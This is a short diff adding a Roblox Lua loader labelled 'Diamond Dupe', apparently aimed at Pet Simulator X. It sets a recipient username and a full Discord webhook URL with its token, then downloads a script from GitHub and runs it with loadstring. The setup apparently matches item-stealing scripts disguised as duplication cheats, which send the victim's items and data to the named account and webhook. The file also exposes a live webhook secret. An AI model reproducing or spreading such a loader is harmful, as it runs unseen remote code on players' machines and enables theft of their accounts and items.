@@ -1,0 +1,5 @@
+_G.Username = "Yeeeeeeeeeeet5261"
+_G.HubName = "Diamond Dupe"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1127721185514369055/mEq3GxPyvLsc6PnkouhD3wLQjqCCEKMiIWgPLxnVoZRDwQRUdyiQPRsr2czWO6Cmewjf"
+
+loadstring(game:HttpGet("https://github.com/Ryantocool/Dupe-Script-Psx"))()
